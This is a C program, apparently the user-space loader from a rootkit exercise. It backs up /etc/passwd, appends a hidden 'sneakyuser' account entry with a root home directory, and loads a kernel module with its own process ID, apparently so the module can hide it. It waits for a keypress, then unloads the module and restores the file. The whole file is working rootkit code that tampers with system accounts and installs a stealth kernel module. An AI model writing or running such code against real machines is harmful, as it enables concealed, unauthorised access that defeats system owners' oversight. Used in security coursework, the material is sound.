#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>

#define PASSWD_PATH "/etc/passwd"
#define BACKUP_PATH "/tmp/passwd"
#define SNEAKY_ENTRY "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n"
#define MODULE_NAME "sneaky_mod"
#define MODULE_PATH "./sneaky_mod.ko"

static void die(const char *message)
{
  perror(message);
  exit(EXIT_FAILURE);
}

static void copy_file(const char *source_path, const char *dest_path)
{
  char buffer[4096];
  ssize_t bytes_read;
  int source_fd = open(source_path, O_RDONLY);
  int dest_fd;

  if (source_fd < 0) {
    die("open source");
  }

  dest_fd = open(dest_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (dest_fd < 0) {
    close(source_fd);
    die("open destination");
  }

  while ((bytes_read = read(source_fd, buffer, sizeof(buffer))) > 0) {
    ssize_t total_written = 0;

    while (total_written < bytes_read) {
      ssize_t bytes_written =
          write(dest_fd, buffer + total_written, bytes_read - total_written);

      if (bytes_written < 0) {
        close(source_fd);
        close(dest_fd);
        die("write");
      }

      total_written += bytes_written;
    }
  }

  if (bytes_read < 0) {
    close(source_fd);
    close(dest_fd);
    die("read");
  }

  if (close(source_fd) < 0) {
    close(dest_fd);
    die("close source");
  }

  if (close(dest_fd) < 0) {
    die("close destination");
  }
}

static void append_sneaky_entry(void)
{
  const char *entry = SNEAKY_ENTRY;
  int passwd_fd = open(PASSWD_PATH, O_WRONLY | O_APPEND);
  size_t entry_length = strlen(entry);
  ssize_t total_written = 0;

  if (passwd_fd < 0) {
    die("open passwd");
  }

  while ((size_t)total_written < entry_length) {
    ssize_t bytes_written = write(passwd_fd, entry + total_written,
                                  entry_length - (size_t)total_written);

    if (bytes_written < 0) {
      close(passwd_fd);
      die("append passwd");
    }

    total_written += bytes_written;
  }

  if (close(passwd_fd) < 0) {
    die("close passwd");
  }
}

static int run_command(const char *path, char *const argv[])
{
  int status;
  pid_t pid = fork();

  if (pid < 0) {
    die("fork");
  }

  if (pid == 0) {
    execvp(path, argv);
    perror("execvp");
    _exit(EXIT_FAILURE);
  }

  if (waitpid(pid, &status, 0) < 0) {
    die("waitpid");
  }

  if (!WIFEXITED(status)) {
    return -1;
  }

  return WEXITSTATUS(status);
}

int main(void)
{
  int ch;
  char pid_arg[64];
  char *insmod_argv[] = {"insmod", MODULE_PATH, pid_arg, NULL};
  char *rmmod_argv[] = {"rmmod", MODULE_NAME, NULL};

  printf("sneaky_process pid = %d\n", getpid());
  copy_file(PASSWD_PATH, BACKUP_PATH);
  append_sneaky_entry();

  snprintf(pid_arg, sizeof(pid_arg), "sneaky_pid=%d", getpid());
  if (run_command("insmod", insmod_argv) != 0) {
    copy_file(BACKUP_PATH, PASSWD_PATH);
    fprintf(stderr, "failed to load sneaky_mod.ko\n");
    return EXIT_FAILURE;
  }

  while ((ch = getchar()) != EOF) {
    if (ch == 'q') {
      break;
    }
  }

  if (run_command("rmmod", rmmod_argv) != 0) {
    copy_file(BACKUP_PATH, PASSWD_PATH);
    fprintf(stderr, "failed to unload sneaky_mod\n");
    return EXIT_FAILURE;
  }

  copy_file(BACKUP_PATH, PASSWD_PATH);
  return 0;
}
